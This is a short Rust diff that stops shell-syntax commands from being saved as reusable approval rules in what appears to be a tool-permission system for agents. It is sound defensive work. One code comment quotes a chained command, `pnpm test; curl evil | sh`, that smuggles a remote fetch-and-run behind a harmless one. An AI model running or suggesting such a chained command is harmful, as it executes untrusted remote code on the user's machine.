@@ -12,6 +12,15 @@ pub(super) async fn save_rule(
     created_by: &str,
     now: i64,
 ) -> Result<(), ServerError> {
+    // A command containing shell syntax is approved for this request only.
+    // Persisting it as a standing prefix would let a different, compound
+    // command reuse the approval (for example `pnpm test; curl evil | sh`).
+    // Non-command tools (row.command == None) still get tool-wide rules.
+    if let Some(command) = row.command.as_deref() {
+        if !threadbase_core::command_is_reusable(command) {
+            return Ok(());
+        }
+    }
     let project_id: String = sqlx::query_scalar("SELECT project_id FROM threads WHERE id = ?")
         .bind(&row.thread_id)
         .fetch_one(pool)
